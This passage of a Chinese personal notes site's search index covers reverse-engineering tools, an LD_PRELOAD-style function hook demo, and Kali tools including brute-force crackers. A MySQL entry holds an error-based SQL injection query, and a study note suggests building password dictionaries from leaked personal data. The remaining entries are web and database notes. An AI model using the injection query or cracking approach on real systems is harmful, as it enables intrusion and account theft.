免费的好像就是普通的IDA","tags":"安全","url":"/yq-doc-source-docs-Safety-Reverse-Engineering-IDA-PRO.html","loc":"/yq-doc-source-docs-Safety-Reverse-Engineering-IDA-PRO.html"},{"title":"IDA-问题总结","text":"Mac下调试需要权限 Mac下一般使用默认的本地调试器, 由于权限问题无法启动 官方建议的解决方案是使用 远程调试 就是启动: /Applications/IDA\\ Pro\\ 7.5/idabin/dbgsrv/mac_server64 后在IDA Pro中选择 Remote Mac OS X debugger 参考: https://hex-rays.com/wp-content/static/tutorials/mac_debugger_primer2/mac_debugger_primer2.html 但是这个要求IDA Pro, 个人免费版不支持remote debug...","tags":"安全","url":"/yq-doc-source-docs-Safety-Reverse-Engineering-IDA-Question-Summary.html","loc":"/yq-doc-source-docs-Safety-Reverse-Engineering-IDA-Question-Summary.html"},{"title":"OllyDbg (OD)","text":"也简称OD, 是一个比较老的32位调试器工具, 只有Windows版本 看最后一次更新是2014年了, 我都还没高考 官网: http://www.ollydbg.de/ 中文站: http://www.ollydbg.org/ 摘自中文站的介绍: OllyDbg是一种具有可视化界面的32位汇编分析调试器，是一个新的动态追踪工具， 将IDA与SoftICE结合起来的思想，Ring3级调试器，非常容易上手， 己代替SoftICE成为当今最为流行的调试解密工具了。同时还支持插件扩展功能，是目前最强大的调试工具。 简单介绍可参考: https://zhuanlan.zhihu.com/p/95151936 使用可参考: https://blog.csdn.net/freeking101/article/details/101180621 汉化: https://developer.aliyun.com/article/865381 (没看上面中文站是不是有)","tags":"安全","url":"/yq-doc-source-docs-Safety-Reverse-Engineering-Ollydbg.html","loc":"/yq-doc-source-docs-Safety-Reverse-Engineering-Ollydbg.html"},{"title":"实战-Mac下Hook其他进程","text":"写一个测试的源码test2.cpp: #include \"stdio.h\" int add(int a, int b){ int tmp = a + 3; return tmp + b; } extern \"C\"{ int add2(int a, int b){ return a+b+10;} } int sub(int a, int b){ return a-b; } void swap(int *a, int *b){ int *tmp; *tmp = *a; *a = *b; *b = *tmp; } int main(){ int a = 10000; int b = 10090; int c = 10000; int d = 10000; int e[] = {10000, 10000, 5, 80}; int f[] = {10000, 5, 10000, 80}; int retAdd = add(a, b); printf(\"a + b + 随机值= %d + %d + 3 = %d\\n\", a, b, retAdd); printf(\"交换a, b的值, 交换前: a: %d; b: %d\\n\", a, b); swap(&a, &b); printf(\"交换a, b的值, 交换后: a: %d; b: %d \\n\", a, b); // fflush(); return 0; } 将其编译为执行文件test2: // g++ -std=c++11 -dynamiclib -g -o libtest2.dylib test2.cpp // g++ -std=c++11 -g -l test2preutil -L /Users/yanque/project/code/TryTest -o test2 test2.cpp /usr/bin/clang++ -std=gnu++14 -fcolor-diagnostics -fansi-escape-codes -g test2.cpp -o test2 编码钩子test2-hook-add-func.cpp: #include \"stdio.h\" #include <dlfcn.h> #include <stdio.h> #include <stdlib.h> // 定义原始函数指针类型 typedef int (*OrigAddFunc)(int a, int b); int add(int a, int b) { OrigAddFunc orig_add = NULL; orig_add = (OrigAddFunc)dlsym(RTLD_NEXT,\"_Z3addii\"); int tmp = orig_add(a, b); fprintf(stderr, \"hook add; a + b = %d + %d = %d\", a, b, tmp); fprintf(stderr, \"%s %d %d\\n\", __FILE__, __LINE__, tmp); return tmp; } 编译为动态库 libtest2hook.dylib : g++ -std=c++11 -dynamiclib -o libtest2hook.dylib test2-hook-add-func.cpp 因为是Mac系统: DYLD_INSERT_LIBRARIES=`pwd`/libtest2hook.dylib ./test2 Linux环境变量是 LD_PRELOAD","tags":"安全","url":"/yq-doc-source-docs-Safety-Reverse-Engineering-Real-Mac-under-other-processes-under-HOOK.html","loc":"/yq-doc-source-docs-Safety-Reverse-Engineering-Real-Mac-under-other-processes-under-HOOK.html"},{"title":"WinDbg","text":"WinDbg 是一个调试器，可用于分析故障转储、 调试实时用户模式和内核模式代码，以及检查 CPU 寄存器和内存。 仅支持Windows 官网: 安装 Windows 调试器 官网调试教程: Windows 调试入门 看到个图文的使用: windbg使用超详细教程","tags":"安全","url":"/yq-doc-source-docs-Safety-Reverse-Engineering-Windbg.html","loc":"/yq-doc-source-docs-Safety-Reverse-Engineering-Windbg.html"},{"title":"汇编","text":"怎么用 参考: 如何阅读简单的汇编(持续更新) 逆向实操、x86/x64汇编、IDA pro静态分析 常见约定寄存器参数及作用 寄存器 作用 %rax 传递返回值 %rdi 传递第一个参数 %rsi 传递第二个参数 %rdx 传递第三个参数 %rcx 传递第四个参数 %r8 传递第五个参数 %r9 传递第六个参数 callee-owned %rsp 栈顶指针 caller-owned %rbx 临时变量 caller-owned %rbp 栈基指 caller-owned %r12-%15 临时变量 caller-owned %rip 存储下一条要执行的指令 %eflags flags和条件判断的结果标志位 xmmO 用来传递第一个double 参数 xmm1 用来传递第二个dioubie 參费 SP 栈寄存器 LR 保存函数返回地址 PC 当前运行到的地址 R0-R3 用来放函数的参数，执行完后，R0存放返回值 R4-R7 用来放函数的局部变量 注解 rdi是8字节的，4字节的时候对应的就是edi。 callee-owned: 如果caller要使用这些寄存机，那么它在调用callee前，要把这些寄存器保存好。 caller-owned: 如果callee要使用这些寄存器，那么它就要保存好这些寄存器的值，并且返回到caller的时候要将这些值恢复。","tags":"安全","url":"/yq-doc-source-docs-Safety-Reverse-Engineering-compilation.html","loc":"/yq-doc-source-docs-Safety-Reverse-Engineering-compilation.html"},{"title":"逆向工程","text":"主要是反编译这方面的 工具: /docs/后端/python/python三方库/frida Jadx: Java反编译工具: Jadx项目地址 Ghidra Cutter 一些没来的及研究的Hook相关 EAT Hook 挂钩技术 Inline Hook 挂钩技术 关于环境变量LD_PRELOAD的利用 LD_PRELOAD 后门 | Linux 后门系列 基于LD_PRELOAD的动态库函数hook LD_PRELOAD，patchelf 与 hook","tags":"安全","url":"/yq-doc-source-docs-Safety-Reverse-Engineering-index.html","loc":"/yq-doc-source-docs-Safety-Reverse-Engineering-index.html"},{"title":"学习记录","text":"为什么需要社工库? 因为大多数人的密码, 跟自己的生日QQ手机号等自己的信息相关 所以搜集后, 有利于进行构建爆破字典 如何增加经验 护网 挖漏洞; CNVD; SRC 靶场实战, 如使用Kali官方的: https://www.vulnhub.com/ 写博客; 公众号 可以试试去考的证书: 还有个软考信息安全工程师 可以平时逛逛的: 几乎所有国内的安全SRC","tags":"安全","url":"/yq-doc-source-docs-Safety-Study-record-index.html","loc":"/yq-doc-source-docs-Safety-Study-record-index.html"},{"title":"Brup","text":"","tags":"安全","url":"/yq-doc-source-docs-Safety-brup-index.html","loc":"/yq-doc-source-docs-Safety-brup-index.html"},{"title":"Kali命令工具","text":"nmap: IP/端口扫描 maltego dirb: 服务目录扫描 whatweb: 服务框架扫描, VUE啥的 cmseek: 指纹扫描 msfconsole: 交互式漏洞搜索工具 hydra: 暴力破解帐密 medusa: 暴力破解帐密 sqlmap: 渗透数据库 wpscan: 漏洞扫描 strings: 以字符串形式 查看图片 exiftool: 查看文件注释 nc: nikto: wfuzz: 爆破 whois: 域名注册信息收集 shodan: IP地址信息收集 tor: 使用代理伪装 有些其实本来就是linux指令, 但在普通场景下一般用不到, 所以放在此处. 备忘, 云服务器厂商. 国外 msf msf/index","tags":"安全","url":"/yq-doc-source-docs-Safety-kali-Kali-command-tool.html","loc":"/yq-doc-source-docs-Safety-kali-Kali-command-tool.html"},{"title":"kali渗透专用指令","text":"","tags":"安全","url":"/yq-doc-source-docs-Safety-kali-Kali-penetration-special-instruction-index.html","loc":"/yq-doc-source-docs-Safety-kali-Kali-penetration-special-instruction-index.html"},{"title":"MSF工具","text":"","tags":"安全","url":"/yq-doc-source-docs-Safety-kali-MSF-index.html","loc":"/yq-doc-source-docs-Safety-kali-MSF-index.html"},{"title":"Kali","text":"","tags":"安全","url":"/yq-doc-source-docs-Safety-kali-index.html","loc":"/yq-doc-source-docs-Safety-kali-index.html"},{"title":"贪心算法","text":"贪心策略: 将求解过程分成若干个步骤， 但每个步骤都应用贪心原则， 选取当前状态下最好/最优的选择（局部最有利的选择）， 并以此希望最后堆叠出的结果也是最好/最优的解。 注解 由于是选取的局部最优, 所以最终结果不一样是全局最优的 一般步骤 从某个初始解出发； 采用迭代的过程，当可以向目标前进一步时，就根据局部最优策略，得到一部分解，缩小问题规模； 将所有解综合起来 例子: 需要找给顾客41分钱，现在的货币有 25 分、20分、10 分、5 分和 1 分四种硬币； 该怎么办？ 按照贪心的三个步骤: 41分，局部最优化原则，先找给顾客25分； 此时，41-25=16分，还需要找给顾客10分，然后5分，然后1分； 最终，找给顾客一个25分，一个10分，一个5分，一个1分，共四枚硬币。 是不是觉得哪里不太对，如果给他2个20分，加一个1分，三枚硬币就可以了呢？&#94;_&#94;; 总结：贪心策略的优缺点 优点 简单，高效，省去了为了找最优解可能需要穷举操作，通常作为其它算法的辅助策略来使用； 缺点 不从总体上考虑其它可能情况，每次选取局部最优解，不再进行回溯处理，所以很少情况下得到最优解。 注解 当然, 如果能推导出 局部最优解能够构成全局最优解, 那么贪心策略才算真正的贪心算法 (这里单纯意义上指能求出正确解的策略才是算法) 与动态规划的区别 贪心算法与动态规划的不同在于它对每个子问题的解决方案都做出选择，不能回退。 动态规划则会保存以前的运算结果，并根据以前的结果对当前进行选择，有回退功能。 基于贪心算法的算法","tags":"数据结构","url":"/yq-doc-source-docs-data-structure-Greedy-algorithm-index.html","loc":"/yq-doc-source-docs-data-structure-Greedy-algorithm-index.html"},{"title":"elasticsearch","text":"介绍 配置 使用的7.13的版本，有一些配置过时了: | 过时配置 | 配置（新） | | :------------------------------: | :----------------------: | | discovery.zen.ping.unicast.hosts | discovery.seed_hosts | | discovery.zen.hosts_provider | discovery.seed_providers | | discovery.zen.nomasterblock | cluster.nomasterblock | discovery.seed_hosts 提供集群中符合主机要求的节点的列表. 每个值的格式为host:port或host ，其中port默认为设置transport.profiles.default.port。 discovery.seed_providers 以文件的方式提供主机列表，可以动态修改，而不用重启节点（容器化环境适用） cluster.initial_master_nodes 设置全新群集中符合主机要求的节点的初始集合. 默认情况下，该列表为空，这意味着该节点希望加入已经被引导的集群 discovery.findpeersinterval 选定主节点发现时间间隔,默认1S 注解 自己测试中发现具有选举权的master节点一定要设置cluster.initial_master_nodes， 值为当前所有可以参与选举的节点，否则会出现 \"master not discovered yet\" 的错误； 非master节点可以不设置，设置了反而会出现真正的master节点无法实时发现的问题， 猜测原因可能是因为，单独的node节点因为设置了，所以与master节点不会主动发生通信 官网文档如下 Static Sets the initial set of master-eligible nodes in a brand-new cluster. By default this list is empty, meaning that this node expects to join a cluster that has already been bootstrapped. See cluster.initial_master_nodes . 在全新的集群中设置初始主节点集。 默认情况下，这个列表是空的，这意味着这个节点希望加入一个已经被引导的集群。 具备成为master节点的应该设置initial_master_nodes为一个master集群列表， 而其他的node不用设置，可以自己引导 （测试发现如果都设置，第一次启动集群时，master节点必须最后启动才可以完全发现所有的node） 更新，有毒吧，全设置了initial_master_nodes，删除了data数据又重新测试了一下， 居然master可以不用最后启动了也可以全部发现了。那就是昨天本机网络有问题？ 分片与副本 分片 将数据分成几份，使用head-master可以很直观的看出， 例如设置分片：5 就会在主页出现0,1,2,3,4五个分片 副本 就是数据的备份， 例如分片为5，副本为1：就会出现0,0,1,1,2,2,3,3,4,4一共十个分片，有一份是副本 官方： 一个索引可以存储超出单个结点硬件限制的大量数据。 比如，一个具有10亿文档的索引占据1TB的磁盘空间，而任一节点都没有这样大的磁盘空间； 或者单个节点处理搜索请求，响应太慢。 为了解决这个问题，Elasticsearch提供了将索引划分成多份的能力，这些份就叫做分片。 当你创建一个索引的时候，你可以指定你想要的分片的数量。 每个分片本身也是一个功能完善并且独立的\"索引\"，这个\"索引\"可以被放置到集群中的任何节点上。 分片之所以重要，主要有两方面的原因： 允许你水平分割/扩展你的内容容量 允许你在分片（潜在地，位于多个节点上）之上进行分布式的、并行的操作，进而提高性能/吞吐量 至于一个分片怎样分布，它的文档怎样聚合回搜索请求， 是完全由Elasticsearch管理的，对于作为用户的你来说，这些都是透明的。 在一个网络/云的环境里，失败随时都可能发生， 在某个分片/节点不知怎么的就处于离线状态，或者由于任何原因消失了。 这种情况下，有一个故障转移机制是非常有用并且是强烈推荐的。 为此目的，Elasticsearch允许你创建分片的一份或多份拷贝，这些拷贝叫做复制分片，或者直接叫复制。 复制之所以重要，主要有两方面的原因： 在分片/节点失败的情况下，提供了高可用性。 因为这个原因，注意到复制分片从不与原/主要（original/primary）分片置于同一节点上是非常重要的。 扩展你的搜索量/吞吐量，因为搜索可以在所有的复制上并行运行 总之，每个索引可以被分成多个分片。 一个索引也可以被复制0次（意思是没有复制）或多次。 一旦复制了，每个索引就有了主分片（作为复制源的原来的分片）和复制分片（主分片的拷贝）之别。 分片和复制的数量可以在索引创建的时候指定。 在索引创建之后，你可以在任何时候动态地改变复制数量，但是不能改变分片的数量。 默认情况下，Elasticsearch中的每个索引被分片5个主分片和1个复制， 这意味着，如果你的集群中至少有两个节点，你的索引将会有5个主分片和另外5个复制分片（1个完全拷贝）， 这样的话每个索引总共就有10个分片。 一个索引的多个分片可以存放在集群中的一台主机上，也可以存放在多台主机上，这取决于你的集群机器数量。 主分片和复制分片的具体位置是由ES内在的策略所决定的。","tags":"数据库","url":"/yq-doc-source-docs-database-elasticsearch-index.html","loc":"/yq-doc-source-docs-database-elasticsearch-index.html"},{"title":"mysql","text":"mysql base 预定义变量: @@datadir 数据路径 @@basedir mysql安装路径 @@version_compile_os mysql安装的系统 备份 备份某一个表: mysqldump -uroot -p $database $table >/tmp/t.sql 全部备份: mysqldump -uroot -p -ARE --triggers --master-data=2 --single-transaction >/tmp/full.sql 其他详细信息见: /docs/数据库/mysql/mysql备份方案 注释 单行: # select -- select 多行: /* select */ 关于字符集修改 直接修改数据表的字符集不一定行, 得删除表重新建表的时候弄字符集 直接修改字符集（不一定有用）: select concat( 'alter table ', TABLE_NAME, ' convert to character set utf8mb4 collate utf8mb4_general_ci;' ) from information_schema.'TABLES' where TABLE_SCHEMA = '$database'; 这个结果为更改语句，直接复制执行即可 诱导报错 诱导报错: select count(*) ,concat((select user()),floor(rand(0)*2))x from information_schema.TABLES group by x; 在mysql5.7中会有以下报错, 8的版本中没有复现出来 诱导报错 sql预处理 设置预处理语句: EXECUTE stmt_name [USING @var_name [, @var_name] ...]; 册除(释放)定义: {DEALLOCATE | DROP} PREPARE stmt_name; 例子: # 设置预处理语句 prepare select_content from 'select table_name, engine from information_schema.TABLES where version = ? and table_schema= ? '; # 设置参数 set @ver=10; set @base='information_schema'; # 执行查询 execute select_content using @ver, @base;","tags":"数据库","url":"/yq-doc-source-docs-database-mysql.html","loc":"/yq-doc-source-docs-database-mysql.html"},{"title":"mysql概念定义","text":"关键字 数据类型 基础 外键约束 外键约束（表2）对父表（表1）的含义: 在父表上进行update/delete以更新或删除在子表中有一条或多条对应匹配行的候选键时， 父表的行为取决于：在定义子表的外键时指定的on update/on delete子句。 含义 CASCADE 删除包含与已删除键值有参照关系的所有记录 SET NULL 修改包含与已删除键值有参照关系的所有记录，使用NULL值替换(只能用于已标记为NOT NULL的字段) RESTRICT 拒绝删除要求，直到使用删除键值的辅助表被手工删除，并且没有参照时(这是默认设置，也是最安全的设置) NO ACTION 啥也不做","tags":"数据库","url":"/yq-doc-source-docs-database-mysql-Conceptual-foundation-index.html","loc":"/yq-doc-source-docs-database-mysql-Conceptual-foundation-index.html"},{"title":"doc可用于rst文本元素","text":"这是按照指令分类 Common Options 公共选项参数 class 不知道有啥用 name 设置方便引用 如: .. image:: bild.png :name: my picture # 引用方式1 .. _my picture: # 引用方式2 .. image:: bild.png 参考: docutils文档","tags":"文档","url":"/yq-doc-source-docs-document-RST-mark-language-DOC-grammar-module-index.html","loc":"/yq-doc-source-docs-document-RST-mark-language-DOC-grammar-module-index.html"},{"title":"rst语法模块","text":"按照用法分类 其他-download download用于引用文件地址, 可点击下载: .. download:`xxx.pdf`","tags":"文档","url":"/yq-doc-source-docs-document-RST-mark-language-Grammar-module-index.html","loc":"/yq-doc-source-docs-document-RST-mark-language-Grammar-module-index.html"},{"title":"rst标记语言","text":"sphinx使用介绍可参考: 官方文档(英) 地址: https://www.sphinx-doc.org 第三方中译 文档: https://daobook.github.io/sphinx/index.html 文档目录: https://daobook.github.io/sphinx/contents.html 插件教程: https://daobook.github.io/sphinx/development/tutorials/index.html 主题使用: https://daobook.github.io/sphinx/usage/theming.html 主题开发: https://daobook.github.io/sphinx/development/theming.html 此文档项目github地址: https://github.com/daobook/daobook.github.io","tags":"文档","url":"/yq-doc-source-docs-document-RST-mark-language-index.html","loc":"/yq-doc-source-docs-document-RST-mark-language-index.html"},{"title":"使用ReadtheDocs托管文档","text":"关键词:: 文档 rst文档 Sphinx 文档托管 ReadtheDocs 是一个基于 Sphinx 的免费文档托管项目. 是一个比较大的文档托管平台. 需要先有一个支持Sphinx文档项目, 然后托管到github, 且需要开源. 去 <https://readthedocs.org/dashboard/> 注册账号并登录, 然后在仪表盘导入github项目即可. 如果是使用github关联登录, 可以直接看到自己的所有github仓库, 选择文档仓库即可 或者选择手动导入, 填写相关信息:","tags":"文档","url":"/yq-doc-source-docs-document-RST-mark-language-question-Use-ReadTHEDOCS-hosting-document.html","loc":"/yq-doc-source-docs-document-RST-mark-language-question-Use-ReadTHEDOCS-hosting-document.html"},{"title":"一些坑","text":"","tags":"文档","url":"/yq-doc-source-docs-document-RST-mark-language-question-index.html","loc":"/yq-doc-source-docs-document-RST-mark-language-question-index.html"},{"title":"wiki","text":"","tags":"文档","url":"/yq-doc-source-docs-document-wiki-index.html","loc":"/yq-doc-source-docs-document-wiki-index.html"},{"title":"包管理器","text":"常见有两个 npm yarn yarn 安装: brew install yarn yarn 默认是去 npm/yarn 官方镜像源（国外）获取资源, 较慢 查询源: yarn config get registry 设置为淘宝源: yarn config set registry https://registry.npm.taobao.org/ 还原: yarn config set registry https://registry.yarnpkg.com 注解 建议所有使用yarn配置的镜像, 再使用npm配置一遍, 因为有些工具 还是用的是npm下载而不是yarn. 第三方工具yrm管理镜像源 安装: npm install -g yrm 列出所有镜像源: yrm ls 切换镜像: yrm use taobao 新增镜像: yrm add aliyun http://maven.aliyun.com/nexus/content/groups/public 删除镜像: yrm del taobao 测试延迟（访问速度）: yrm test aliyun 查看帮助: yrm -h","tags":"前端","url":"/yq-doc-source-docs-front-end-Bag-manager.html","loc":"/yq-doc-source-docs-front-end-Bag-manager.html"},{"title":"内置函数/对象","text":"内置对象 字符串操作 字符串前后剔除 trim() 剔除首尾空格, 类似于Python的 strip() trimLeft() 剔除首空格 trimRight() 剔除尾空格 切片 slice(start, end) 接受两个参数：开始索引和结束索引(可选), 它会返回一个新的字符串，包含从开始索引到结束索引之间的字符（不包括结束索引对应的字符）。 如果省略结束索引，则 slice() 方法会复制从开始索引到字符串末尾的所有字符。 数组也有slice, 使用一致 数组操作 slice(start, end) 接受两个参数：开始索引和结束索引(可选), 它会返回一个新的数组，包含从开始索引到结束索引之间的元素（不包括结束索引对应的元素）。 如果省略结束索引，则 slice() 方法会复制从开始索引到数组末尾的所有元素。 字符串也有slice, 使用一致","tags":"前端","url":"/yq-doc-source-docs-front-end-Built--in-function-index.html","loc":"/yq-doc-source-docs-front-end-Built--in-function-index.html"},{"title":"css常用属性","text":"place-content、justify-content、align-items 和 text-align 区别 place-content：设置 Grid 布局元素在容器中的水平和垂直对齐方式 place-content 属性是 CSS Grid 布局的一个简写属性， 用于同时设置元素在容器中的水平和垂直方向上的对齐方式。 它接受两个值，第一个值表示水平对齐方式，第二个值表示垂直对齐方式。 例如：place-content: center center; 表示在容器中水平和垂直方向上居中对齐。 justify-content：设置 Flexbox 布局元素在容器主轴和交叉轴上的对齐方式 justify-content 属性用于设置元素在容器的主轴（水平轴）上的对齐方式。 它适用于使用 Flexbox 布局或 CSS Grid 布局的容器。 常见的值包括 flex-start（默认值，左对齐）、flex-end（右对齐）、 center（居中对齐）、space-between（两端对齐，项目之间平均分布）、space-around（项目周围平均分布）等。 align-items：设置 Flexbox 布局元素在容器主轴和交叉轴上的对齐方式 align-items 属性用于设置元素在容器的交叉轴（垂直轴）上的对齐方式。 它适用于使用 Flexbox 布局或 CSS Grid 布局的容器。 常见的值包括 flex-start（默认值，顶部对齐）、flex-end（底部对齐）、 center（居中对齐）、baseline（基线对齐，元素的基线对齐）等。 text-align：设置元素框内文本内容的水平对齐方式 text-align 属性用于设置文本内容在元素框中的水平对齐方式。 它适用于块级元素和一些内联元素。 常见的值包括 left（默认值，左对齐）、right（右对齐）、 center（居中对齐）、justify（两端对齐）等。该属性主要用于调整文本的对齐方式，而不是元素本身。","tags":"前端","url":"/yq-doc-source-docs-front-end-CSS-CSS-commonly-used-attributes-index.html","loc":"/yq-doc-source-docs-front-end-CSS-CSS-commonly-used-attributes-index.html"},{"title":"css","text":"一些伪类选择器 hover: 鼠标悬停 focus: 元素获取焦点(如input键盘选中) active: 元素激活, 这个没怎么理解 none与unset区别 none: 指定没有样式的值或属性. 它常用于清除或禁用某个样式属性的效果 unset: 将样式属性重置为其默认值. 它会将属性值重置为浏览器默认值或继承值， 根据具体属性的默认行为而定。使用 \"unset\" 可以撤销已应用的样式，并将其恢复为初始状态 像素单位 rem rem 是相对于根元素（即 <html> 元素）的字体大小来计算的单位 px px 是固定的像素单位 em 类似于 rem， em 也是相对于父元素的字体大小计算的单位。 不同之处在于，em 是相对于最近的父级元素的字体大小来计算的。 如果没有显式设置父元素的字体大小，em 单位将继承自上级元素的字体大小。 % 百分比单位是相对于父元素的尺寸来计算的。 例如，设置一个元素的宽度为 50%，表示该元素的宽度将是其父元素宽度的一半。 vw 和 vh vw 和 vh 分别表示视口宽度（Viewport Width）和视口高度（Viewport Height）的百分比单位。 例如，1vw 表示视口宽度的 1%。这些单位用于创建响应式布局，可以根据视口的大小来确定元素的尺寸。 ex（相对于小写字母 \"x\" 的高度）、ch（相对于数字 \"0\" 的宽度）等 这些单位相对于字体相关的尺寸进行计算。 绝对单位 除了相对单位，CSS 还支持一些绝对单位，如 cm（厘米）、mm（毫米）、in（英寸）、pt（磅）等。 这些单位在打印和物理媒体方面比较常用。 导入其他css 比如在 theme.css 中导入 checkbox.css: /* theme.css */ @import url(checkbox.css); chrome支持前端断点 比如按钮点击后的断点","tags":"前端","url":"/yq-doc-source-docs-front-end-CSS-index.html","loc":"/yq-doc-source-docs-front-end-CSS-index.html"},{"title":"概念性","text":"","tags":"前端","url":"/yq-doc-source-docs-front-end-Conceptual-index.html","loc":"/yq-doc-source-docs-front-end-Conceptual-index.html"},{"title":"ES6","text":"基本上参照 菜鸟教程-ES6教程 ES6， 全称 ECMAScript 6.0 ，是 JavaScript 的下一个版本标准，2015.06 发版。 ES6 主要是为了解决 ES5 的先天不足，比如 JavaScript 里并没有类的概念， 但是目前浏览器的 JavaScript 是 ES5 版本，大多数高版本的浏览器也支持 ES6，不过只实现了 ES6 的部分特性和功能。 JavaScript 的正式名称是 ECMAScript 语法基础: 一些相关工具 Node.js Node.js 是运行在服务端的 JavaScript，它对 ES6 的支持度更高 在 Node.js 环境中运行 ES6: $ node > let sitename=\"runoob\" undefined > console.log(sitename) runoob undefined > webpack webpack 是一个现代 JavaScript 应用程序的静态模块打包器 (module bundler) . 当 webpack 处理应用程序时，它会递归地构建一个依赖关系图 (dependency graph) , 其中包含应用程序需要的每个模块，然后将所有这些模块打包成一个或多个 bundle 。 webpack 主要有四个核心概念: 入口 (entry) 入口会指示 webpack 应该使用哪个模块，来作为构建其内部依赖图的开始. 进入入口起点后，webpack 会找出有哪些模块和库是入口起点（直接和间接）依赖的. 在 webpack 中入口有多种方式来定义: 单个入口（简写） 语法: const config = { entry: \"./src/main.js\" } 对象 语法: const config = { app: \"./src/main.js\", vendors: \"./src/vendors.js\" } 输出 (output) output 属性会告诉 webpack 在哪里输出它创建的 bundles ， 以及如何命名这些文件，默认值为 ./dist: const config = { entry: \"./src/main.js\", output: { filename: \"bundle.js\", path: path.resolve(__dirname, 'dist') } } loader loader 让 webpack 可以去处理那些非 JavaScript 文件（ webpack 自身只理解 JavaScript ）. loader 可以将所有类型的文件转换为 webpack 能够有效处理的模块， 例如，开发的时候使用 ES6 ，通过 loader 将 ES6 的语法转为 ES5 ，如下配置: const config = { entry: \"./src/main.js\", output: { filename: \"bundle.js\", path: path.resolve(__dirname, 'dist') }, module: { rules: [ { test: /\\.js$/, exclude: /node_modules/, loader: \"babel-loader\", options: [ presets: [\"env\"] ] } ] } } 插件 (plugins) loader 被用于转换某些类型的模块，而插件则可以做更多的事情. 包括打包优化、压缩、定义环境变量等等. 插件的功能强大，是 webpack 扩展非常重要的利器，可以用来处理各种各样的任务. 使用只需要 require() ，然后添加到 plugins 数组中: // 通过 npm 安装 const HtmlWebpackPlugin = require('html-webpack-plugin'); // 用于访问内置插件 const webpack = require('webpack'); const config = { module: { rules: [ { test: /\\.js$/, exclude: /node_modules/, loader: \"babel-loader\" } ] }, plugins: [ new HtmlWebpackPlugin({template: './src/index.html'}) ] }; gulp 基于流的自动化构建工具","tags":"前端","url":"/yq-doc-source-docs-front-end-ES6-index.html","loc":"/yq-doc-source-docs-front-end-ES6-index.html"},{"title":"开源图标库","text":"codicon vscode有个开源图标库 codicon , 可在此预览: https://microsoft.github.io/vscode-codicons/dist/codicon.html 也有个仓库: https://github.com/microsoft/vscode-codicons/tree/main/src/icons 没注意是否一致 处了直接从上述仓库下载完整的svg图标, 还可以: 普通js项目 直接引入cdn: <script src=\"https://unpkg.com/vscode-codicons/dist/codicon.js\"></script> const addIcon = codicon.add; ... 或者npm安装: npm install vscode-codicons --save 引入并使用: import * as codicon from 'vscode-codicons'; const addIcon = codicon.add; theia项目 可以直接导入使用: import {codicon} from \"@theia/core/lib/browser\" render(){ return <span className={`${codicon('add')}`}/> } fontawesome 安装免费使用的: yarn add @fortawesome/fontawesome-free --save 预览: https://fontawesome.com/v5/search","tags":"前端","url":"/yq-doc-source-docs-front-end-Open-source-icon-library.html","loc":"/yq-doc-source-docs-front-end-Open-source-icon-library.html"},{"title":"TypeScript","text":"TypeScript 微软开发, 自由、开源的编程语言; 是 JavaScript 的一个超集 TypeScript 是 JavaScript 的超集，扩展了 JavaScript 的语法， 因此现有的 JavaScript 代码可与 TypeScript 一起工作无需任何修改，TypeScript 通过类型注解提供编译时的静态类型检查。 TypeScript 可处理已有的 JavaScript 代码，并只对其中的 TypeScript 代码进行编译。 执行方式: 方法1: 先用 tsc 编译为js, 然后执行 方法2: 使用 ts-node 直接执行ts文件(需要安装typescript ts-node @types/node tslib库) 语法 相关指令 条件语句 if [else [if ...]] switch...case 循环 普通的for, eg: for ( init; condition; increment ){ statement(s); } for...in语句: for (var val in list) { //语句 } 其他如for…of 、every 和 some 循环 while语句: while(condition) { statement(s); } do...while: do { statement(s); }while( condition ); 请注意，条件表达式出现在循环的尾部，所以循环中的 statement(s) 会在条件被测试之前至少执行一次 命令空间使用 命名空间的名称可以与类名一致, 但是 如果类是 export, 命名空间也要 export 类要先命名空间声明","tags":"前端","url":"/yq-doc-source-docs-front-end-TypeScript-index.html","loc":"/yq-doc-source-docs-front-end-TypeScript-index.html"},{"title":"Electron","text":"中文官方文档: Electron 28.0.0 最新文档地址: https://www.electronjs.org/zh/docs/latest/","tags":"前端","url":"/yq-doc-source-docs-front-end-frame-Electron-index.html","loc":"/yq-doc-source-docs-front-end-frame-Electron-index.html"},{"title":"低代码框架amis","text":"低代码框架旨在仅用极少的配置信息来表述一个页面 关于amis, 个人觉得, 最好的适用情况是: 已经有完备的后端api, 只需要简单的规划前端JSON即可 像与React结合这种, 个人不建议使用JSON的形式, 因为有一些交互是需要代码实例变量介入的, 实在要介入, 要么React类变量等不参与JSON的数据流转, 要么, 感觉直接使用amis提供好的组件以JSX的形式使用. 当然, 个人观点. 痛点-数据域的更新 当子层更新数据域后,上层不会收到更新(数据域向上更新); 当某次更新数据域后, 下次打开还是旧的(当前数据域数据保存); 必须通过api来更新, 坑点... 请求适配器 可用于对请求数据的过滤等操作, 见: https://aisuda.bce.baidu.com/amis/zh-CN/docs/types/api#配置请求适配器 组件的简单自定义 官方原文见: https://aisuda.bce.baidu.com/amis/zh-CN/docs/extend/custom-react 例子: { // type: 'custom-kv-text', name: 'envDD', label: 'label-d', mode: \"horizontal\", asFormItem: true, children: ({value, onChange, data}: any) => ( <React.Fragment> <p>这个是个自定义组件</p> {/*<p>当前值：{value}</p>*/} <input type='text' value={typeof value === 'object' ? JSON.stringify(value) : value} onChange={(e) => { let curData = e.target.value try { curData = JSON.parse(curData) data.envData = curData } catch (err) { console.log('not json schema') // return } onChange(curData) }} /> </React.Fragment> ) },","tags":"前端","url":"/yq-doc-source-docs-front-end-frame-amis-index.html","loc":"/yq-doc-source-docs-front-end-frame-amis-index.html"},{"title":"问题总结","text":"","tags":"前端","url":"/yq-doc-source-docs-front-end-frame-amis-question-index.html","loc":"/yq-doc-source-docs-front-end-frame-amis-question-index.html"},{"title":"前端框架","text":"","tags":"前端","url":"/yq-doc-source-docs-front-end-frame-index.html","loc":"/yq-doc-source-docs-front-end-frame-index.html"},{"title":"React API","text":"","tags":"前端","url":"/yq-doc-source-docs-front-end-frame-react-API-index.html","loc":"/yq-doc-source-docs-front-end-frame-react-API-index.html"},{"title":"forwardRef","text":"官网: https://zh-hans.react.dev/reference/react/forwardRef React.forwardRef 会创建一个React组件，这个组件能够将其接受的 ref 属性转发到其组件树下的另一个组件中。 这种技术并不常见，但在以下两种场景中特别有用： 转发 refs 到 DOM 组件 在高阶组件中转发 refs 转发 DOM 组件(内置组件节点) 一般情况下, ref不能挂到一个函数式组件 , 使用 fowardRef 就可以支持: const App: React.FC = () => { const ref = useRef(null); useEffect(() => { ref.current.focus(); }, []); return ( <> <Child ref={ref} /> </> ); }; const Child = forwardRef((props, ref: 